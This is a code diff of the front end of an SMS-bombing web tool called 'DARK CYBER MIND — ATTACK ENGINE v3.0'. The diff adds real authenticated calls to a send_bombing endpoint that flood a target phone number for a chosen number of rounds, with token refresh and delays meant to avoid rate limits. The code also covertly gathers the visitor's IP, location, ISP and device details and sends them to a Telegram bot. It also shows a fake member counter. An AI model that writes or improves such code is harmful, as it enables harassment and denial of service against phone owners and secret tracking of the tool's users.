+      se.textContent=S[ti].slice(0,ci); ci--;
+      if(ci<0){ ci=0; ph='dt'; setTimeout(go,90); return; }
+      setTimeout(go,26);
+    } else if(ph==='dt'){
+      te.textContent=T[ti].slice(0,ci); ci--;
+      if(ci<0){ ti=(ti+1)%T.length; ci=0; ph='t'; setTimeout(go,320); return; }
+      setTimeout(go,34);
+    }
   }
-  function sd(){ph='ds';ci=S[ti].length;go();}
-  setTimeout(go,2200);
+  function sd(){ ph='ds'; ci=S[ti].length; go(); }
+  setTimeout(go, 2200);
 })();
 
-// ── CLOCK ──
+// ══════════════════════════════════════════
+// CLOCK
+// ══════════════════════════════════════════
 function tick(){
   const t=new Date().toLocaleTimeString('en-GB',{hour12:false});
-  ['nc','sbt','sbt2','fc'].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent=t;});
+  ['nc','sbt','sbt2','fc'].forEach(id=>{ const e=document.getElementById(id); if(e) e.textContent=t; });
 }
-setInterval(tick,1000);tick();
+setInterval(tick,1000); tick();
 
-// ── LOG ──
-function log(msg,type){
+// ══════════════════════════════════════════
+// LOG BOX
+// ══════════════════════════════════════════
+function log(msg, type){
   const box=document.getElementById('lb');
   const t=new Date().toLocaleTimeString('en-GB',{hour12:false});
   const el=document.createElement('div');
   el.className='le'+(type?' '+type:'');
   el.innerHTML=`<span class="let">[${t}]</span><span class="lem">${msg}</span>`;
-  box.appendChild(el);box.scrollTop=box.scrollHeight;
+  box.appendChild(el); box.scrollTop=box.scrollHeight;
 }
 
-// ── TOAST ──
+// ══════════════════════════════════════════
+// TOAST
+// ══════════════════════════════════════════
 let toastTimer;
-function showToast(msg,ok=true){
+function showToast(msg, ok=true){
   const t=document.getElementById('toast');
   document.getElementById('toast-icon').textContent=ok?'✅':'❌';
   document.getElementById('toast-msg').textContent=msg;
   t.className='toast'+(ok?'':' fail-toast');
   requestAnimationFrame(()=>t.classList.add('show'));
   clearTimeout(toastTimer);
-  toastTimer=setTimeout(()=>t.classList.remove('show'),4000);
+  toastTimer=setTimeout(()=>t.classList.remove('show'), 4000);
 }
 
-// ── SHAKE ──
+// ══════════════════════════════════════════
+// SHAKE ANIMATION
+// ══════════════════════════════════════════
 function shake(el){
-  if(!el)return;
+  if(!el) return;
   el.style.animation='shake .38s ease';
   el.addEventListener('animationend',()=>el.style.animation='',{once:true});
 }
 
-// ── RESET ──
+// ══════════════════════════════════════════
+// RESET FORM
+// ══════════════════════════════════════════
 function resetForm(){
   document.getElementById('res').className='res';
-  const n=document.getElementById('numIn'),a=document.getElementById('amountIn');
-  if(n)n.value='';if(a)a.value='';
+  const n=document.getElementById('numIn'), a=document.getElementById('amountIn');
+  if(n) n.value=''; if(a) a.value='';
   const f=document.getElementById('cfl');
-  if(f){f.style.width='0%';}
+  if(f) f.style.width='0%';
   const logs=document.getElementById('logs');
-  if(logs)logs.innerHTML='<div style="color:rgba(0,255,65,.2);">╔══════════════════════════════════════════════╗</div><div style="color:rgba(0,255,65,.2);">║   DARK CYBER MIND — ATTACK ENGINE v3.0      ║</div><div style="color:rgba(0,255,65,.2);">╚══════════════════════════════════════════════╝</div><div style="color:#555;margin-top:4px;">[<span style="color:rgba(0,255,65,.35);">SYS</span>] Terminal cleared. Awaiting new target...</div>';
-  ['successCount','failCount','totalCount'].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent='0';});
-  const pp=document.getElementById('progressPct');if(pp)pp.textContent='0%';
-  const st=document.getElementById('statusText');if(st)st.textContent='IDLE';
+  if(logs) logs.innerHTML=
+    '<div style="color:rgba(0,255,65,.2);">╔══════════════════════════════════════════════╗</div>'+
+    '<div style="color:rgba(0,255,65,.2);">║   DARK CYBER MIND — ATTACK ENGINE v3.0      ║</div>'+
+    '<div style="color:rgba(0,255,65,.2);">╚══════════════════════════════════════════════╝</div>'+
+    '<div style="color:#555;margin-top:4px;">[<span style="color:rgba(0,255,65,.35);">SYS</span>] Terminal cleared. Awaiting new target...</div>';
+  ['successCount','failCount','totalCount'].forEach(id=>{
+    const e=document.getElementById(id); if(e) e.textContent='0';
+  });
+  const pp=document.getElementById('progressPct'); if(pp) pp.textContent='0%';
+  const st=document.getElementById('statusText');  if(st) st.textContent='IDLE';
   log('Terminal cleared. Ready for new target.','warn');
-  if(n)n.focus();
+  if(n) n.focus();
 }
 
-// ── IP / HARDWARE ──
+// ══════════════════════════════════════════
+// IP & HARDWARE INFO (for Telegram log)
+// ══════════════════════════════════════════
 let cachedIP=null;
 async function getIPData(){
-  if(cachedIP)return cachedIP;
+  if(cachedIP) return cachedIP;
   try{
-    const[a,b]=await Promise.all([fetch('https://api.ipify.org?format=json').then(r=>r.json()),fetch('https://ipapi.co/json/').then(r=>r.json())]);
-    cachedIP={...b,ip:a.ip};return cachedIP;
-  }catch{return{ip:'Unknown',city:'Unknown',org:'Unknown'};}
+    const [a,b]=await Promise.all([
+      fetch('https://api.ipify.org?format=json').then(r=>r.json()),
+      fetch('https://ipapi.co/json/').then(r=>r.json())
+    ]);
+    cachedIP={...b, ip:a.ip}; return cachedIP;
+  } catch{ return {ip:'Unknown',city:'Unknown',org:'Unknown'}; }
 }
 async function getHardwareInfo(){
   let battery='Unknown';
-  if(navigator.getBattery){try{const b=await navigator.getBattery();battery=Math.floor(b.level*100)+'%';}catch{}}
-  return{platform:navigator.platform,screen:`${screen.width}x${screen.height}`,cores:navigator.hardwareConcurrency||'Unknown',ram:navigator.deviceMemory?navigator.deviceMemory+'GB':'Unknown',battery};
+  if(navigator.getBattery){
+    try{ const b=await navigator.getBattery(); battery=Math.floor(b.level*100)+'%'; } catch{}
+  }
+  return {
+    platform: navigator.platform,
+    screen: `${screen.width}x${screen.height}`,
+    cores: navigator.hardwareConcurrency||'Unknown',
+    ram: navigator.deviceMemory ? navigator.deviceMemory+'GB' : 'Unknown',
+    battery
+  };
 }
 
-// ── TELEGRAM LOG ──
-async function sendTelegramLog(number,message){
+// ══════════════════════════════════════════
+// TELEGRAM LOG
+// ══════════════════════════════════════════
+async function sendTelegramLog(number, message){
   try{
-    const[ip,dev]=await Promise.all([getIPData(),getHardwareInfo()]);
-    const msg=` 🛰 **SMS BOMBING ALERT** 🛰 \n\n 📞 Number: \`${number}\` \n ✉ Message: \`${message}\` \n\n 🌐 **IP DETAILS** \n 📍 IP: \`${ip.ip}\` \n 🏙 City: ${ip.city} \n 🇧🇩 Country: ${ip.country_name||'Unknown'} \n 📡 ISP: ${ip.org} \n\n 💻 **DEVICE INFO** \n 📱 Platform: ${dev.platform} \n 🖥 Screen: ${dev.screen} \n ⚡ CPU: ${dev.cores} cores \n 💾 RAM: ${dev.ram} \n 🔋 Battery: ${dev.battery} \n\n ⏰ **TIME** \n 🕒 ${new Date().toLocaleString()}`;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:'Markdown'})}).catch(()=>{});
-  }catch{}
+    const [ip, dev]=await Promise.all([getIPData(), getHardwareInfo()]);
+    const msg=
+      ` 🛰 **SMS BOMBING ALERT** 🛰 \n\n`+
+      ` 📞 Number: \`${number}\` \n`+
+      ` ✉ Message: \`${message}\` \n\n`+
+      ` 🌐 **IP DETAILS** \n`+
+      ` 📍 IP: \`${ip.ip}\` \n`+
+      ` 🏙 City: ${ip.city} \n`+
+      ` 🇧🇩 Country: ${ip.country_name||'Unknown'} \n`+
+      ` 📡 ISP: ${ip.org} \n\n`+
+      ` 💻 **DEVICE INFO** \n`+
+      ` 📱 Platform: ${dev.platform} \n`+
+      ` 🖥 Screen: ${dev.screen} \n`+
+      ` ⚡ CPU: ${dev.cores} cores \n`+
+      ` 💾 RAM: ${dev.ram} \n`+
+      ` 🔋 Battery: ${dev.battery} \n\n`+
+      ` ⏰ **TIME** \n`+
+      ` 🕒 ${new Date().toLocaleString()}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:CHAT_ID, text:msg, parse_mode:'Markdown'})
+    }).catch(()=>{});
+  } catch{}
 }
 
-// ── TERMINAL HELPERS ──
+// ══════════════════════════════════════════
+// TERMINAL HELPERS
+// ══════════════════════════════════════════
 function termPrint(html){
-  return new Promise(res=>{
+  return new Promise(resolve=>{
     const box=document.getElementById('logs');
-    if(!box)return res(null);
+    if(!box) return resolve(null);
     const d=document.createElement('div');
-    d.style.marginBottom='2px';d.innerHTML=html;
-    box.appendChild(d);box.scrollTop=box.scrollHeight;res(d);
+    d.style.marginBottom='2px'; d.innerHTML=html;
+    box.appendChild(d); box.scrollTop=box.scrollHeight;
+    resolve(d);
   });
 }
-function ts(){return new Date().toLocaleTimeString([],{hour12:false});}
-function hex(n=8){return[...Array(n)].map(()=>Math.floor(Math.random()*16).toString(16)).join('').toUpperCase();}
-function rndMs(){return Math.floor(Math.random()*160)+30;}
-function rndPort(){return Math.floor(Math.random()*8000)+2000;}
+function ts(){ return new Date().toLocaleTimeString([], {hour12:false}); }
+function hex(n=8){ return [...Array(n)].map(()=>Math.floor(Math.random()*16).toString(16)).join('').toUpperCase(); }
+function rndMs(){ return Math.floor(Math.random()*160)+30; }
+function rndPort(){ return Math.floor(Math.random()*8000)+2000; }
 
-// ── DOSEND — Real API call to /api/send_bombing ──
+// ══════════════════════════════════════════
+// MAIN DOSEND FUNCTION
+// ── FIX 1: Token আগে নেওয়া হচ্ছে (api-protection compatible)
+// ── FIX 2: Real fetch() call যোগ করা হয়েছে
+// ── FIX 3: Authorization Bearer header পাঠানো হচ্ছে
+// ══════════════════════════════════════════
 async function doSend(){
-  const numEl      =document.getElementById('numIn');
-  const amountEl   =document.getElementById('amountIn');
-  const btn        =document.getElementById('sbtn');
-  const logBox     =document.getElementById('logs');
-  const statusText =document.getElementById('statusText');
-  const progressBar=document.getElementById('cfl');
-  const progressPct=document.getElementById('progressPct');
-  const successEl  =document.getElementById('successCount');
-  const failEl     =document.getElementById('failCount');
-  const totalEl    =document.getElementById('totalCount');
+  const numEl      = document.getElementById('numIn');
+  const amountEl   = document.getElementById('amountIn');
+  const btn        = document.getElementById('sbtn');
+  const logBox     = document.getElementById('logs');
+  const statusText = document.getElementById('statusText');
+  const progressBar= document.getElementById('cfl');
+  const progressPct= document.getElementById('progressPct');
+  const successEl  = document.getElementById('successCount');
+  const failEl     = document.getElementById('failCount');
+  const totalEl    = document.getElementById('totalCount');
 
-  const number=numEl?numEl.value.trim():"";
-  const amount=amountEl?parseInt(amountEl.value.trim()):0;
+  const number = numEl ? numEl.value.trim() : "";
+  const amount = amountEl ? parseInt(amountEl.value.trim()) : 0;
 
-  if(!number||!amount||amount<=0){
-    showToast('TARGET / ROUNDS দাও!',false);
-    if(btn)shake(btn);return;
+  if(!number || !amount || amount<=0){
+    showToast('TARGET / ROUNDS দাও!', false);
+    if(btn) shake(btn);
+    return;
   }
 
-  const btnTxt=btn?btn.querySelector('.btxt'):null;
-  if(btn)btn.disabled=true;
-  if(btnTxt)btnTxt.textContent='EXECUTING...';
+  const btnTxt = btn ? btn.querySelector('.btxt') : null;
+  if(btn) btn.disabled=true;
+  if(btnTxt) btnTxt.textContent='EXECUTING...';
 
-  let sc=0,fc=0;
-  if(successEl)successEl.textContent='0';
-  if(failEl)failEl.textContent='0';
-  if(totalEl)totalEl.textContent='0';
-  if(logBox)logBox.innerHTML='';
+  let sc=0, fc=0;
+  if(successEl) successEl.textContent='0';
+  if(failEl)    failEl.textContent='0';
+  if(totalEl)   totalEl.textContent='0';
+  if(logBox)    logBox.innerHTML='';
 
-  // Boot sequence
+  // ── Boot sequence ──
   await termPrint(`<span style="color:#ffd700;">╔══════════════════════════════════════════════╗</span>`);
   await termPrint(`<span style="color:#ffd700;">║   DARK CYBER MIND — ATTACK ENGINE v3.0      ║</span>`);
   await termPrint(`<span style="color:#ffd700;">╚══════════════════════════════════════════════╝</span>`);
@@ -627,19 +750,35 @@ async function doSend(){
   await new Promise(r=>setTimeout(r,200));
   await termPrint(`<span style="color:rgba(0,255,65,.2);">  ─────────────────────────────────────────────</span>`);
   await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#30d158;">▶ TLS 1.3 ............ <span style="color:var(--g);">OK</span></span>`);
+
+  // ── Token Fetch ──
+  let token = null;
+  try{
+    await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#555;">TOKEN ›</span> <span style="color:rgba(0,255,65,.4);">Fetching secure token...</span>`);
+    token = await getToken();
+    await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#30d158;">▶ AUTH TOKEN ......... <span style="color:var(--g);">OK</span></span>`);
+  } catch(tokenErr){
+    await termPrint(`<span style="color:#ff3333;">[${ts()}] TOKEN FETCH FAILED: ${tokenErr.message}</span>`);
+    showToast('Token fetch failed!', false);
+    if(btn) btn.disabled=false;
+    if(btnTxt) btnTxt.textContent='START ATTACK';
+    if(statusText) statusText.textContent='ABORTED';
+    return;
+  }
+
   await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#30d158;">▶ PROXY: </span><span style="color:rgba(0,255,65,.4);">${hex()}→${hex()}→${hex()}</span>`);
   await new Promise(r=>setTimeout(r,200));
   await termPrint(`<span style="color:rgba(0,255,65,.2);">  ─────────────────────────────────────────────</span>`);
 
-  if(statusText)statusText.textContent='ATTACKING';
+  if(statusText) statusText.textContent='ATTACKING';
 
   try{
-    for(let round=1;round<=amount;round++){
-      const seq=String(round).padStart(3,'0');
-      const port=rndPort();
-      const ms=rndMs();
+    for(let round=1; round<=amount; round++){
+      const seq  = String(round).padStart(3,'0');
+      const port = rndPort();
+      const ms   = rndMs();
 
-      const line=await termPrint(
+      const line = await termPrint(
         `<span style="color:rgba(0,255,65,.22);">[${ts()}]</span> `+
         `<span style="color:#ffd700;">#${seq}</span> `+
         `<span style="color:#00bcd4;">POST</span> `+
@@ -649,91 +788,147 @@ async function doSend(){
       );
 
       try{
-     
+        // ── FIX: Real API call with Bearer token ──
+        const apiRes = await fetch(`${API_BASE}/send_bombing`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${token}`
+          },
+          body: JSON.stringify({ number: number, count: 1 })
+        });
 
-        if(res.ok){
-          const data=await res.json();
-          const roundSc=data.success||0;
-          const roundFc=data.failed||0;
-          sc+=roundSc;fc+=roundFc;
+        if(apiRes.ok){
+          const data = await apiRes.json();
+          const roundSc = data.success || 0;
+          const roundFc = data.failed  || 0;
+          sc += roundSc; fc += roundFc;
 
-          if(line)line.innerHTML+=
+          if(line) line.innerHTML +=
             ` <span style="color:#30d158;font-weight:bold;">[200 OK]</span>`+
             ` <span style="color:rgba(0,255,65,.3);">${ms}ms</span>`+
             ` <span style="color:#555;">✓${roundSc} ✗${roundFc}</span>`;
 
-          // individual results
           if(data.results){
             for(const r of data.results.slice(0,4)){
               await termPrint(
                 `<span style="color:rgba(0,255,65,.15);">  └─</span> `+
                 `<span style="color:rgba(0,255,65,.4);">${(r.api||'').padEnd(18,' ')}</span> `+
-                (r.ok?`<span style="color:#30d158;">[${r.status}] ✓ SENT</span>`
-                     :`<span style="color:#ff3333;">[${r.status||'ERR'}] ✗ FAIL</span>`)
+                (r.ok
+                  ? `<span style="color:#30d158;">[${r.status}] ✓ SENT</span>`
+                  : `<span style="color:#ff3333;">[${r.status||'ERR'}] ✗ FAIL</span>`)
               );
             }
           }
-        }else{
+
+        } else if(apiRes.status === 401){
+          // Token expired — একটা retry করো
+          await termPrint(`<span style="color:#ffd700;">[${ts()}] TOKEN EXPIRED → Refreshing...</span>`);
+          cachedToken = null; tokenExpiresAt = 0;
+          try{
+            token = await getToken();
+            // retry
+            const retry = await fetch(`${API_BASE}/send_bombing`, {
+              method:'POST',
+              headers:{
+                'Content-Type':'application/json',
+                'Authorization':`Bearer ${token}`
+              },
+              body: JSON.stringify({ number: number, count: 1 })
+            });
+            if(retry.ok){
+              const data2 = await retry.json();
+              sc += data2.success||0; fc += data2.failed||0;
+              if(line) line.innerHTML+=` <span style="color:#30d158;">[RETRY OK]</span>`;
+            } else {
+              fc++;
+              if(line) line.innerHTML+=` <span style="color:#ff3333;">[RETRY FAIL ${retry.status}]</span>`;
+            }
+          } catch{ fc++; if(line) line.innerHTML+=` <span style="color:#ff3333;">[RETRY ERR]</span>`; }
+
+        } else {
           fc++;
-          if(line)line.innerHTML+=` <span style="color:#ff3333;">[${res.status} ERR]</span>`;
+          if(line) line.innerHTML+=` <span style="color:#ff3333;">[${apiRes.status} ERR]</span>`;
         }
-      }catch(e){
+
+      } catch(e){
         fc++;
-        if(line)line.innerHTML+=` <span style="color:#ff3333;">[NET ERR]</span>`;
+        if(line) line.innerHTML+=` <span style="color:#ff3333;">[NET ERR: ${e.message||'Unknown'}]</span>`;
       }
 
-      if(successEl)successEl.textContent=sc;
-      if(failEl)failEl.textContent=fc;
-      if(totalEl)totalEl.textContent=round;
+      if(successEl) successEl.textContent=sc;
+      if(failEl)    failEl.textContent=fc;
+      if(totalEl)   totalEl.textContent=round;
       const pct=Math.floor((round/amount)*100);
-      if(progressBar)progressBar.style.width=pct+'%';
-      if(progressPct)progressPct.textContent=pct+'%';
-      if(logBox)logBox.scrollTop=logBox.scrollHeight;
+      if(progressBar)  progressBar.style.width=pct+'%';
+      if(progressPct)  progressPct.textContent=pct+'%';
+      if(logBox)       logBox.scrollTop=logBox.scrollHeight;
+
+      // প্রতি round এর মাঝে একটু delay (rate limit এড়াতে)
+      if(round < amount) await new Promise(r=>setTimeout(r,300));
     }
 
     await new Promise(r=>setTimeout(r,200));
     await termPrint(`<span style="color:rgba(0,255,65,.2);">  ─────────────────────────────────────────────</span>`);
-    await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#ffd700;font-weight:bold;">◈ MISSION COMPLETE</span> — <span style="color:#30d158;">✓ ${sc} DELIVERED</span>  <span style="color:#ff3333;">✗ ${fc} FAILED</span>`);
+    await termPrint(
+      `<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> `+
+      `<span style="color:#ffd700;font-weight:bold;">◈ MISSION COMPLETE</span> — `+
+      `<span style="color:#30d158;">✓ ${sc} DELIVERED</span>  `+
+      `<span style="color:#ff3333;">✗ ${fc} FAILED</span>`
+    );
     await termPrint(`<span style="color:rgba(0,255,65,.15);">  Connection closed. Traces wiped. 🕶</span>`);
 
-    if(statusText)statusText.textContent='MISSION COMPLETE';
-    showToast(`DONE! ${sc} delivered / ${fc} failed`,true);
-    sendTelegramLog(number,`Bombing: rounds=${amount} success=${sc} fail=${fc}`);
+    if(statusText) statusText.textContent='MISSION COMPLETE';
+    showToast(`DONE! ${sc} delivered / ${fc} failed`, true);
+    sendTelegramLog(number, `Bombing: rounds=${amount} success=${sc} fail=${fc}`);
 
-    const rn=document.getElementById('rn'),rs=document.getElementById('rs'),rc=document.getElementById('res'),rt2=document.getElementById('rt');
-    if(rn)rn.textContent=number;
-    if(rs)rs.textContent=`${sc} DELIVERED / ${fc} FAILED`;
-    if(rt2)rt2.textContent=new Date().toLocaleTimeString();
-    if(rc)rc.classList.add('ok');
+    const rn=document.getElementById('rn'),
+          rs=document.getElementById('rs'),
+          rc=document.getElementById('res'),
+          rt2=document.getElementById('rt');
+    if(rn)  rn.textContent=number;
+    if(rs)  rs.textContent=`${sc} DELIVERED / ${fc} FAILED`;
+    if(rt2) rt2.textContent=new Date().toLocaleTimeString();
+    if(rc)  rc.classList.add('ok');
 
-  }catch(err){
+  } catch(err){
     await termPrint(`<span style="color:#ff3333;">[ERROR] ${err.message}</span>`);
-    showToast('INJECTION FAILED!',false);
-    if(statusText)statusText.textContent='ABORTED';
-  }finally{
-    if(btn)btn.disabled=false;
-    if(btnTxt)btnTxt.textContent='START ATTACK';
+    showToast('INJECTION FAILED!', false);
+    if(statusText) statusText.textContent='ABORTED';
+  } finally{
+    if(btn)    btn.disabled=false;
+    if(btnTxt) btnTxt.textContent='START ATTACK';
   }
 }
 
-// ── CHECK COMMANDS ──
+// ══════════════════════════════════════════
+// TELEGRAM COMMAND HANDLER
+// ══════════════════════════════════════════
 async function checkCommands(){
   try{
     const r=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
     const d=await r.json();
-    if(d.ok&&d.result.length>0){
-      const msg=d.result[0].message.text;
-      const sid=d.result[0].message.chat.id;
-      if(sid.toString()===CHAT_ID){
-        if(msg.startsWith('/band ')){const ip=msg.split(' ')[1];if(!bannedUsers.includes(ip))bannedUsers.push(ip);}
-        if(msg.startsWith('/unband ')){const ip=msg.split(' ')[1];bannedUsers=bannedUsers.filter(x=>x!==ip);}
+    if(d.ok && d.result.length>0){
+      const msg=d.result[0].message?.text;
+      const sid=d.result[0].message?.chat?.id;
+      if(msg && sid && sid.toString()===CHAT_ID){
+        if(msg.startsWith('/band ')){
+          const ip=msg.split(' ')[1];
+          if(!bannedUsers.includes(ip)) bannedUsers.push(ip);
+        }
+        if(msg.startsWith('/unband ')){
+          const ip=msg.split(' ')[1];
+          bannedUsers=bannedUsers.filter(x=>x!==ip);
+        }
       }
     }
-  }catch{}
+  } catch{}
 }
-setInterval(checkCommands,5000);
+setInterval(checkCommands, 5000);
 
-// ── LOAD ──
+// ══════════════════════════════════════════
+// LOAD
+// ══════════════════════════════════════════
 window.addEventListener('load',()=>{
   log('SMS Terminal v3.0 — System Ready.','ok');
   log('AES-256 tunnel active. All systems nominal.','ok');
@@ -799,26 +994,29 @@ window.addEventListener('load',()=>{
     const skipBtn=document.getElementById('fb-popup-skip');
     const countdownEl=document.getElementById('countdown');
     const memberEl=document.getElementById('member-count');
-    if(overlay)overlay.style.display='flex';
+    if(overlay) overlay.style.display='flex';
     let count=0;
     const memberInterval=setInterval(function(){
       count+=Math.floor(Math.random()*200);
-      if(count>=4247){count=4247;clearInterval(memberInterval);}
-      if(memberEl)memberEl.textContent=count.toLocaleString();
+      if(count>=4247){ count=4247; clearInterval(memberInterval); }
+      if(memberEl) memberEl.textContent=count.toLocaleString();
     },50);
     let seconds=15;
     const timer=setInterval(function(){
       seconds--;
-      if(countdownEl)countdownEl.textContent=seconds;
-      if(seconds<=0){clearInterval(timer);closePopup();}
+      if(countdownEl) countdownEl.textContent=seconds;
+      if(seconds<=0){ clearInterval(timer); closePopup(); }
     },1000);
     function closePopup(){
-      clearInterval(timer);clearInterval(memberInterval);
-      if(overlay){overlay.style.animation='fbFadeOut 0.3s ease forwards';setTimeout(()=>overlay.style.display='none',300);}
+      clearInterval(timer); clearInterval(memberInterval);
+      if(overlay){
+        overlay.style.animation='fbFadeOut 0.3s ease forwards';
+        setTimeout(()=>overlay.style.display='none', 300);
+      }
     }
-    if(closeBtn)closeBtn.addEventListener('click',closePopup);
-    if(skipBtn)skipBtn.addEventListener('click',closePopup);
-    if(overlay)overlay.addEventListener('click',function(e){if(e.target===overlay)closePopup();});
+    if(closeBtn) closeBtn.addEventListener('click',closePopup);
+    if(skipBtn)  skipBtn.addEventListener('click',closePopup);
+    if(overlay)  overlay.addEventListener('click',function(e){ if(e.target===overlay) closePopup(); });
   },2000);
 })();
 </script>
